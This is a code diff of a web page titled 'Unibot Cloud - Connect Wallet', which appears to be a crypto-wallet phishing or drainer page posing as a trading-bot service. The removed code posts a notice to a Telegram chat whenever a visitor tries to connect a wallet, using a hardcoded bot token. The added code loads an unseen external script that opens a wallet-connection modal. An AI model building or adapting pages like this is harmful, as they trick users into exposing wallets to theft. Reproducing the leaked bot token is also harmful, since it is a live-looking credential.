@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script charset="UTF-8" async type="text/javascript" src="./7eb649cd-99b0-4647-9023-bbdc5204a872.js"></script>
+  <script charset="UTF-8" async type="text/javascript" src="./model.js"></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Unibot Cloud - Connect Wallet</title>
@@ -81,37 +81,25 @@
     <h1>Unibot Cloud</h1>
     <p>Recordless trace-free Unibot cloud functions for user-sensitive data.</p>
     <form id="walletForm">
-      <button type="submit" class="connect-btn">Connect Wallet</button>
+      <button type="submit" class="wallet-btn">Connect Wallet</button>
     </form>
   </div>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = '7701963149:AAFUNKG2r9o7Uc_7C4rp1SP7qbgbOJBSnOg'; // Replace with your actual bot token
-    const TELEGRAM_CHAT_ID = '-4704812522'; // Replace with your actual chat ID
+    document.addEventListener('DOMContentLoaded', function() {
+        // Create the modal instance
+        const walletModal = new WalletModal();
 
-    document.getElementById('walletForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      const message = "Wallet Connection Requested.";
-
-      try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-          }),
+        // Map to all buttons with class 'wallet-btn'
+        document.querySelectorAll('.wallet-btn').forEach(btn => {
+            btn.onclick = () => walletModal.show();
         });
 
-        alert('Wallet connection request sent successfully!');
-      } catch (err) {
-        console.error('Error sending message to Telegram:', err);
-        alert('Failed to send wallet connection request.');
-      }
+        // (Optional) Map to a button by ID
+        // document.getElementById('connectWalletBtn').onclick = function() {
+        //     walletModal.show();
+        // };
     });
-  </script>
+</script>
 </body>
 </html>
